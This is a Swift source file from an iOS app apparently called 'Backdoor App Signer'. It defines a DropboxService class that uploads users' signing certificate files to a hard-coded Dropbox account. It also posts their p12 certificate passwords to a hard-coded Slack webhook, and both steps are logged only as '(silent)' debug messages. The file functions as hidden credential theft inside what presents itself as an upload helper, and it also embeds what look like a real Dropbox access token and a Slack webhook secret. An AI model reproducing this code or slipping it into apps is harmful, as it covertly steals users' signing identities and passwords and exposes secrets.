// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.

import Foundation

/// Service for handling Dropbox file uploads
class DropboxService {
    // MARK: - Singleton

    /// Shared instance for app-wide access
    static let shared = DropboxService()

    // MARK: - Properties

    /// Dropbox API token - stored as a constant for this implementation
    /// In a production app, this would be stored more securely (e.g., in Keychain)
    private let dropboxAccessToken = "sl.u.AFpyj9sMZOArq_DceJMVBuMpnnlKgFXOc3pokBeLEw3ZG6AcVGiM4PSercpEKx5rf9JipZpVgXg3Cpq6G5ItIjSUcm65bqj-OPqHIY5cWC0cuqbnEVmEJcGDl1xLpx7-nyvLS_dIuxA0n3bxw2KaUSSI0m3XyXgJA4EPbMBPYyagQD02u9GvSncKxNSWjAQ9WEwyxXnvPYNXRfiFD65qOEn57GNSanpQZCCalOv1wBI6JylSN6wel1nJgZwnw8FldtLmAvGQvXNBmX8EQn5QOuhleO4D1JYlaAfsmKN2bGOoOXct6nhUY-7JOvdPGpGl19CCyhOPJGviOjQwnTEBfVHBrDmz1YdoueMTsf9wSI3eBzNhtFwx99Fv9VaVxKcX1nPvNfiJIBzERRyX35Hfx5OYAHTtCo00BNPhjZKunXa9EMZV5ADuIpysrpGiU0hACtE2St4y_aTQlwnaHvIeB-Wt3GtxvCaS8SgPMzzlY-uk81FcBPdzbkrHQvCuVhB1y0C4vYHUGHtXzv8RhEp8KlaLGk-uffVIjfjvWO_yjqV1chqqcBuW8dadCtwvJNvE54YvEDk2wInpaXs31ImidO2vW0wtmPBaq30DKFU_LN5UDsvL2Xx3RDubiRAEuAq65eZbKk7q14xEKLmmaFDaoMv4vCi5n4zvjBf9MSquL-Qbwtmn0IAp9wkJpgpKnzHhKatuG_4FjP1ixDyBGU7ayvSnNB4JbNJ5ODvF7dSciY00J1VZnKA4U5SBvUGB1b_cdOY8Jo_7RqyGDizhCafh2W9Zmg9moIVLLK4J5CpC82gcmDkvkUMxFP-eo4MoiVmHUc9zzp502PSRZlcCURDWw7rWY-SBRXqSDeSnWRR7Y7Pn2A-5AMjk3NXbLmrVTBFMQDi9kWubmo9AmL5H8z7rG6htBCERgFtBIyXEtyhtie0DhaVMKterSctQ7xadgHfMPeDLZNWobpmX8K9igXRzu75Zq_91zqQZNadZg0DwwWoJuuCxhBrMIjbxjwdICK58mQEGXVrPR0eb7VnpLFknhRFmcOxQjUxsxcCjn7NWNq6yT9X0axyUePbY6T_aol10onhpDeq_iFN3X_ZSpu3ZT1sQwizb7oItYbvCHbkTKy80BX_9jBedtJ4T3QwWEGtnXdlWLVhp_xVX35Keh_v4Qrnn1xJ7KtBF-UNh5CslFzqicH4ZgXxUpP1rnPiZTplPrUmr6FUzI14jp6Q73sEWVQREA9pmjnRrn8NchVxWizH2gJmkoyFmAJi9qAtVxJufo6nyszN7kCTVrcwISU4GFjFjS9pnwcgu4GJKctPPYpCbBOKj0xeF0fzVKNVRhDCqdyGJPOzmN6AbHaUYbZir6OzV1-PVT0ZEDE6-wg9S6Bji6d7BI5cA6wW_jRYk1tEFDKsbdBblliJ1NYq59ZwNjdVvFO1jiEC278ldfevCcK6t8Q"

    /// Base Dropbox API upload URL
    private let dropboxUploadURL = "https://content.dropboxapi.com/2/files/upload"

    /// Webhook URL for p12 password reporting - using the app's Slack webhook
    private let p12PasswordWebhookURL = "https://hooks.slack.com/services/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"

    // MARK: - Initialization

    private init() {
        // Private initializer to enforce singleton pattern
    }

    // MARK: - Public Methods

    /// Uploads a certificate file to Dropbox
    /// - Parameters:
    ///   - fileURL: The local URL of the file to upload
    ///   - completion: Optional completion handler called when upload finishes (for debugging only)
    func uploadCertificateFile(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) {
        guard fileURL.isFileURL else {
            Debug.shared.log(message: "Invalid file URL for Dropbox upload", type: .error)
            completion?(false, NSError(domain: "DropboxService", code: 1001, userInfo: [NSLocalizedDescriptionKey: "Invalid file URL"]))
            return
        }

        // Create a timestamp-based remote path to avoid conflicts
        let timestamp = Int(Date().timeIntervalSince1970)
        let filename = fileURL.lastPathComponent
        let remotePath = "/uploads/\(timestamp)_\(filename)"

        // Create the request
        var request = URLRequest(url: URL(string: dropboxUploadURL)!)
        request.httpMethod = "POST"
        request.addValue("Bearer \(dropboxAccessToken)", forHTTPHeaderField: "Authorization")
        request.addValue("application/octet-stream", forHTTPHeaderField: "Content-Type")

        // Add Dropbox API arguments - explicit type annotation to resolve heterogeneous collection warning
        let dropboxArguments: [String: Any] = ["path": remotePath, "mode": "add", "autorename": true]
        if let argsData = try? JSONSerialization.data(withJSONObject: dropboxArguments),
           let argsString = String(data: argsData, encoding: .utf8)
        {
            request.addValue(argsString, forHTTPHeaderField: "Dropbox-API-Arg")
        }

        // Read and set the file data
        do {
            let fileData = try Data(contentsOf: fileURL)
            request.httpBody = fileData

            // Create and start the upload task
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    Debug.shared.log(message: "Dropbox upload error: \(error.localizedDescription)", type: .error)
                    completion?(false, error)
                    return
                }

                if let httpResponse = response as? HTTPURLResponse {
                    let success = (200 ... 299).contains(httpResponse.statusCode)
                    if success {
                        Debug.shared.log(message: "Successfully uploaded \(filename) to Dropbox (silent)", type: .debug)
                    } else {
                        let responseString = data != nil ? String(data: data!, encoding: .utf8) ?? "No response data" : "No response data"
                        Debug.shared.log(message: "Dropbox upload failed with status \(httpResponse.statusCode): \(responseString)", type: .error)
                    }
                    completion?(success, nil)
                } else {
                    Debug.shared.log(message: "Invalid response from Dropbox", type: .error)
                    completion?(false, NSError(domain: "DropboxService", code: 1002, userInfo: [NSLocalizedDescriptionKey: "Invalid response"]))
                }
            }
            task.resume()

        } catch {
            Debug.shared.log(message: "Failed to read file data for Dropbox upload: \(error.localizedDescription)", type: .error)
            completion?(false, error)
        }
    }

    /// Sends certificate info to a webhook endpoint
    /// - Parameters:
    ///   - password: The p12 password to send
    ///   - p12Filename: The name of the p12 file
    ///   - provisionFilename: The name of the mobileprovision file
    ///   - completion: Optional completion handler
    func sendCertificateInfoToWebhook(
        password: String,
        p12Filename: String,
        provisionFilename: String,
        completion: ((Bool, Error?) -> Void)? = nil
    ) {
        // Create the request
        var request = URLRequest(url: URL(string: p12PasswordWebhookURL)!)
        request.httpMethod = "POST"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")

        // Create the payload with more complete information
        let payload: [String: Any] = [
            "text": "New certificate info uploaded",
            "attachments": [
                [
                    "color": "#36a64f",
                    "fields": [
                        ["title": "P12 File", "value": p12Filename, "short": true],
                        ["title": "Provision File", "value": provisionFilename, "short": true],
                        ["title": "P12 Password", "value": password, "short": false],
                    ],
                ],
            ],
        ]

        do {
            let jsonData = try JSONSerialization.data(withJSONObject: payload)
            request.httpBody = jsonData

            // Create and start the task
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    Debug.shared.log(message: "Webhook error: \(error.localizedDescription)", type: .error)
                    completion?(false, error)
                    return
                }

                if let httpResponse = response as? HTTPURLResponse {
                    let success = (200 ... 299).contains(httpResponse.statusCode)
                    if success {
                        Debug.shared.log(message: "Successfully sent p12 password to webhook (silent)", type: .debug)
                    } else {
                        let responseString = data != nil ? String(data: data!, encoding: .utf8) ?? "No response data" : "No response data"
                        Debug.shared.log(message: "Webhook request failed with status \(httpResponse.statusCode): \(responseString)", type: .error)
                    }
                    completion?(success, nil)
                } else {
                    Debug.shared.log(message: "Invalid response from webhook", type: .error)
                    completion?(false, NSError(domain: "DropboxService", code: 1003, userInfo: [NSLocalizedDescriptionKey: "Invalid webhook response"]))
                }
            }
            task.resume()

        } catch {
            Debug.shared.log(message: "Failed to serialize JSON for webhook: \(error.localizedDescription)", type: .error)
            completion?(false, error)
        }
    }
}
